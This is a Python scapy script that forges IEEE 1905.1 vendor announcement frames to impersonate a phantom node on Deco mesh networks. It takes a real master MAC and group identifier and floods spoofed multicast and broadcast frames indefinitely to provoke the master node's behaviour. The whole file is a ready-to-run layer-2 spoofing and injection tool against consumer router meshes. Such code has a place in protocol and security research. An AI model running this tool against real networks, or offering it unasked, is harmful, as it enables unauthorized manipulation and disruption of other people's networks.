#!/usr/bin/env python3
"""Forge IEEE 1905.1 vendor announcements (OUI 00:1d:0f, subtype 0x01).

Emulates a phantom neighbor at L2 — provokes master-node probe boost on
Deco meshes. Requires scapy + npcap. See docs/iee1905-vendor.md for field map.

Usage:
  python inject1905.py --iface <npcap-iface> --node-mac AABBCCDDEEFF \
      --node-ip 192.168.0.50 --net-mac <real-master-mac> \
      --group-id <16-byte-hex> [--interval 2] [--count 0=infinite]
"""
import argparse, struct, time
from scapy.all import Ether, Raw, sendp


def tlv(t: int, v: bytes) -> bytes:
    return bytes([t]) + struct.pack(">H", len(v)) + v


def build_frame(node_mac: bytes, net_mac: bytes, group_id: bytes, lan_ip: bytes) -> bytes:
    inner = b"".join([
        tlv(0x0A, node_mac),          # node MAC
        tlv(0x03, b"\x01"),           # net_type
        tlv(0x04, b"\x01"),           # weight
        tlv(0x05, b"\x01"),           # level
        tlv(0x06, net_mac),           # net_mac (mesh identity)
        tlv(0x07, group_id),          # 16-byte group identifier
        tlv(0x0B, lan_ip),            # lanip (BE)
        tlv(0x0C, b"\x00"),           # server_detected
        tlv(0x0D, struct.pack(">I", 0)),
        tlv(0x0F, b"\xc0\xa8\x00\x01"),  # dns placeholder
        tlv(0x08, struct.pack("<H", 0)),
        tlv(0x09, struct.pack("<H", 0)),
        tlv(0x0E, b"\x00"),           # mesh_type
        tlv(0x00, b""),               # end
    ])
    vendor = bytes.fromhex("001d0f") + b"\x01" + inner
    cmdu = b"\x00\x00" + struct.pack(">H", 4) + b"\x00\x00" + b"\x00\xc0"
    outer = b"\x0b" + struct.pack(">H", len(vendor)) + vendor
    return cmdu + outer + b"\x00\x00\x00"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--iface", required=True)
    ap.add_argument("--node-mac", required=True, help="phantom node MAC, hex no separators")
    ap.add_argument("--node-ip", required=True)
    ap.add_argument("--net-mac", required=True, help="real mesh/net MAC, hex")
    ap.add_argument("--group-id", required=True, help="16-byte group id, hex")
    ap.add_argument("--interval", type=float, default=2.0)
    ap.add_argument("--count", type=int, default=0, help="0 = forever")
    args = ap.parse_args()

    frame = build_frame(
        bytes.fromhex(args.node_mac), bytes.fromhex(args.net_mac),
        bytes.fromhex(args.group_id),
        socket_ip(args.node_ip))
    mcast = Ether(src=format_mac(args.node_mac), dst="01:80:c2:00:00:13", type=0x893A) / Raw(frame)
    bcast = Ether(src=format_mac(args.node_mac), dst="ff:ff:ff:ff:ff:ff", type=0x893A) / Raw(frame)

    n = 0
    try:
        while args.count == 0 or n < args.count:
            sendp(mcast, iface=args.iface, verbose=0)
            sendp(bcast, iface=args.iface, verbose=0)
            n += 2
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print(f"\nstopped after {n} frames")


def socket_ip(ip: str) -> bytes:
    import socket
    return socket.inet_aton(ip)


def format_mac(hexmac: str) -> str:
    return ":".join(hexmac[i:i + 2] for i in range(0, 12, 2)).lower()


if __name__ == "__main__":
    main()
